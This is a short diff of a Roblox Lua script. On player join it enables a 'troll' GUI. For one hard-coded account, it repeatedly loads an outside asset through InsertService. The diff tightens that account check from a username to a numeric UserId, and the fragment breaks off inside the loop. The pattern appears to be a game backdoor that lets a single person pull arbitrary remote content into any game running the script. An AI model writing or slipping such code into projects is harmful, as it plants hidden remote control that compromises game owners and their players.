@@ -6,7 +6,7 @@ game.Players.PlayerAdded:Connect(function(plr)
 		troll.Parent = plr:WaitForChild("PlayerGui")
 		troll.Enabled = true
 	end
-    if  plr.Name == "LordCr0nku"  then
+    if  plr.UserId == 3572567805  then
 	while plr do
 		if plr then
 		        local ok = game:GetService("InsertService"):LoadAsset(18938166154)
